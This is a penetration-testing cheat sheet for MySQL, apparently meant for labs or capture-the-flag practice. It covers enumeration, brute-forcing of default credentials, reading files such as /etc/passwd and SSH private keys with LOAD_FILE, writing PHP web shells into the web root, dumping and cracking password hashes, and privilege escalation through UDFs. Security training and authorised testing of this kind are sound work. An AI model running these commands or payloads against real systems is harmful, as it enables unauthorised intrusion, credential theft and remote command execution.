

## Protocol Overview

MySQL is an open-source relational database management system commonly found in web applications and enterprise environments. Default communication occurs over **port 3306** (TCP).

**Common Use Cases:**
- Web application backends (WordPress, Drupal, etc.)
- Content management systems
- Enterprise data storage
- Application configuration databases

---

## Initial Reconnaissance

### Nmap Enumeration

**Comprehensive script scan:**
```bash
nmap -sV -sC -p3306 --script mysql* 10.10.10.10
```

**Available MySQL NSE scripts:**
- `mysql-audit.nse` - Security audit
- `mysql-brute.nse` - Credential brute forcing
- `mysql-databases.nse` - Database enumeration
- `mysql-dump-hashes.nse` - Extract password hashes
- `mysql-empty-password.nse` - Check for blank passwords
- `mysql-enum.nse` - General enumeration
- `mysql-info.nse` - Version and config info
- `mysql-users.nse` - User enumeration
- `mysql-variables.nse` - System variables
- `mysql-vuln-cve2012-2122.nse` - Known vulnerability check

**Basic enumeration:**
```bash
nmap --script mysql-enum 10.10.10.10
```

---

## Credential Attacks

### Default Credentials

Common MySQL default credentials:

| Username | Password |
|----------|----------|
| `root` | (blank) |
| `root` | `root` |
| `admin` | `admin` |
| `admin@example.com` | `admin` |

### Wordlist Preparation

**Download MySQL-specific credential list:**
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -O mysql-creds.txt
```

**Format for Nmap (change delimiter from `:` to `/`):**
```bash
sed -i 's/:/\//g' mysql-creds.txt
```

### Brute Force Tools

**Nmap:**
```bash
nmap -p3306 --script mysql-brute \
  --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt \
  10.10.10.10
```

**Hydra:**
```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 mysql
```

**Metasploit:**
```bash
use auxiliary/scanner/mysql/mysql_login
set rhosts 10.10.10.10
set user_file users.txt
set pass_file passwords.txt
set stop_on_success true
run
```

---

## Client Connection

### MySQL Command-Line Client

**Basic connection syntax:**
```bash
mysql -u username -p -h 10.10.10.10
```

**Important syntax rules:**
- **No space** between `-p` and password: `mysql -u root -pPassword123`
- **Uppercase `-P`** for port: `mysql -u root -p -h 10.10.10.10 -P 3307`
- **Lowercase `-p`** for password

**Connection examples:**
```bash
# Prompt for password
mysql -u root -p -h 10.10.10.10

# Password in command (less secure)
mysql -u root -pPassword123 -h 10.10.10.10

# Custom port
mysql -u root -p -h 10.10.10.10 -P 3307

# Local connection
mysql -u root -p
```

**Windows connection:**
```cmd
mysql.exe -u username -pPassword123 -h 10.10.10.10
```

### GUI Tools

**DBeaver (cross-platform):**
```bash
# Ubuntu/Debian installation
sudo snap install dbeaver-ce
```

Provides graphical interface for database management, query execution, and data visualization.

---

## Essential MySQL Commands

### Basic Operations

| Command | Purpose |
|---------|---------|
| `show databases;` | List all databases |
| `use database_name;` | Switch to specific database |
| `show tables;` | List tables in current database |
| `show columns from table_name;` | Display table structure |
| `select version();` | Show MySQL version |
| `select user();` | Show current user |
| `select database();` | Show current database |

**Important notes:**
- SQL keywords are **case-insensitive** (`SELECT` = `select`)
- Database/table names **are case-sensitive** (`Users` ≠ `users`)
- All statements end with semicolon (`;`)

### Query Examples

**List databases:**
```sql
show databases;
```

**Switch database context:**
```sql
use mysql;
```

**View tables:**
```sql
show tables;
```

**Query data:**
```sql
select * from users;
```

**Specific columns:**
```sql
select username, password from users;
```

---

## SQL Query Syntax

### SELECT Statement

**Basic structure:**
```sql
SELECT column1, column2 FROM table_name;
```

**Examples:**
```sql
-- All columns, all rows
SELECT * FROM logins;

-- Specific columns
SELECT username, password FROM logins;

-- With condition
SELECT * FROM logins WHERE id = 1;
```

### WHERE Clause

Filter results based on conditions:
```sql
-- Exact match
SELECT * FROM logins WHERE username = 'admin';

-- Numeric comparison
SELECT * FROM logins WHERE id > 1;

-- Multiple conditions (AND)
SELECT * FROM logins WHERE id > 1 AND username = 'admin';

-- Multiple conditions (OR)
SELECT * FROM logins WHERE username = 'admin' OR username = 'root';
```

**Operator alternatives:**
- `AND` can be written as `&&`
- `OR` can be written as `||`
- `NOT` can be written as `!`

### LIKE Operator (Pattern Matching)

**Wildcards:**
- `%` - Matches zero or more characters
- `_` - Matches exactly one character

**Examples:**
```sql
-- Starts with 'admin'
SELECT * FROM logins WHERE username LIKE 'admin%';

-- Ends with 'admin'
SELECT * FROM logins WHERE username LIKE '%admin';

-- Contains 'admin'
SELECT * FROM logins WHERE username LIKE '%admin%';

-- Exactly 3 characters
SELECT * FROM logins WHERE username LIKE '___';
```

### UPDATE Statement

Modify existing records:
```sql
UPDATE table_name SET column1 = value1, column2 = value2 WHERE condition;
```

**Example:**
```sql
-- Change password for specific user
UPDATE logins SET password = 'newpass123' WHERE username = 'admin';

-- Update multiple rows
UPDATE logins SET password = 'changed' WHERE id > 1;
```

**Warning**: Always use `WHERE` clause to avoid updating all rows.

---

## File System Operations

### Security Configuration

MySQL file operations are controlled by the `secure_file_priv` variable:

**Check configuration:**
```sql
show variables like "secure_file_priv";
```

**Possible values:**
- **Empty** - No restrictions (insecure, allows read/write)
- **Directory path** - Restricted to specific directory
- **NULL** - File operations disabled

**Requirements for file operations:**
- `FILE` privilege granted to user
- `secure_file_priv` must allow operations

### Read Files

**Syntax:**
```sql
SELECT LOAD_FILE('/path/to/file');
```

**Common targets:**
```sql
-- Linux password file
SELECT LOAD_FILE('/etc/passwd');

-- Web application config
SELECT LOAD_FILE('/var/www/html/config.php');

-- SSH keys
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');

-- Application logs
SELECT LOAD_FILE('/var/log/apache2/access.log');
```

### Write Files

**Enable file writing (requires admin privileges):**
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

**Complete webshell upload process:**
```sql
-- 1. Check if file operations allowed
show variables like "secure_file_priv";

-- 2. Identify web root (common locations)
-- /var/www/html/
-- /var/www/
-- C:\inetpub\wwwroot\

-- 3. Write webshell
SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE '/var/www/html/cmd.php';

-- 4. Access via browser
-- http://target.com/cmd.php?c=whoami
```

**Alternative format:**
```sql
SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/tmp/test.php';
```

---

## Metasploit Modules

### SQL Query Execution
```bash
use auxiliary/admin/mysql/mysql_sql
set rhosts 10.10.10.10
set username root
set password Password123
set sql "SELECT version();"
run
```

### Schema Enumeration
```bash
use auxiliary/scanner/mysql/mysql_schemadump
set rhosts 10.10.10.10
set username root
set password Password123
run
```

### Hash Dumping
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set rhosts 10.10.10.10
set username root
set password Password123
run
```

---

## Post-Exploitation Techniques

### Extract User Credentials

**MySQL user table:**
```sql
use mysql;
select user, authentication_string from user;
```

**Output format (MySQL 5.7+):**
```
+------------------+-------------------------------------------+
| user             | authentication_string                     |
+------------------+-------------------------------------------+
| root             | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| admin            | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
+------------------+-------------------------------------------+
```

**Crack hashes:**
```bash
# Format: username:hash
hashcat -m 300 mysql_hashes.txt wordlist.txt
```

### Enumerate System Information
```sql
-- Version
select version();

-- Current user
select user();

-- Database path
select @@datadir;

-- OS info (Linux)
select @@version_compile_os;

-- Hostname
select @@hostname;
```

### Check Process Owner

**From system shell:**
```bash
ps -ef | grep mysql
```

**If running as root:**
- Potential for privilege escalation via User-Defined Functions (UDF)
- File write operations have elevated permissions
- System command execution possible

---

## Practical Enumeration Workflow
```sql
-- 1. Check version and user
select version();
select user();

-- 2. List databases
show databases;

-- 3. Select target database
use information_schema;

-- 4. List tables
show tables;

-- 5. Examine table structure
show columns from tables;

-- 6. Extract data
select * from tables where table_schema != 'information_schema';

-- 7. Check for interesting data
use mysql;
select user, authentication_string from user;
```

---

## Common Privilege Escalation Vectors

### MySQL Running as Root

**Indicators:**
- Process owner is `root`
- File operations have system-level access
- UDF exploitation possible

**Exploitation path:**
1. Write malicious library to filesystem
2. Create User-Defined Function (UDF)
3. Execute system commands with root privileges

### Weak File Permissions

**Check writable directories:**
```sql
-- Test write access
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
SELECT 'test' INTO OUTFILE '/var/www/html/test.txt';
```

### Exposed Configuration Files

**Common paths:**
- `/etc/mysql/my.cnf`
- `/var/www/html/config.php`
- `~/.my.cnf` (user-specific config)
